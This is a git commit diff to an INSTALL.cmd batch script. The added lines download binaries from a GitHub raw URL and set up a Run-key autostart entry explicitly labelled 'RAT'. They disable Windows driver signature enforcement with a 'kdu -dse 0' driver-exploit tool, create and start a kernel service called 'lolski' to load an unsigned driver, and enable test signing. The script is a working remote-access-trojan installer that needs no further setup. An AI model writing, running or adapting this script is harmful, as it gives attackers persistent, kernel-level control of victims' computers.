18600722341ae8e7c1253eb6d50c2c4949d7290a
CodeBlog <72720495+CodeBlog-x64@users.noreply.github.com>
2021-11-13 15:48:53 -0500

    Add files via upload

--- INSTALL.cmd
+++ INSTALL.cmd
@@ -1,9 +1,13 @@
 cd C:/ProgramData
 curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/Cdll.bin
-curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/loader.exe
+curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/kdu.exe
 curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/CEsys.sys
 curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/DrvCom.exe
-loader
-DrvCom -f c:\ProgramData\Cdll.bin
-exit
+curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/drv64.dll
+reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAT /d ""C:\ProgramData\DrvCom.exe" -f c:\programdata\Cdll.bin" /t REG_SZ
+kdu -dse 0
+sc create lolski binPath= "C:\ProgramData\CEsys.sys" type= kernel start= system
+sc start lolski
+DrvCom -f c:\programdata\Cdll.bin
+bcdedit /set testsigning on
 
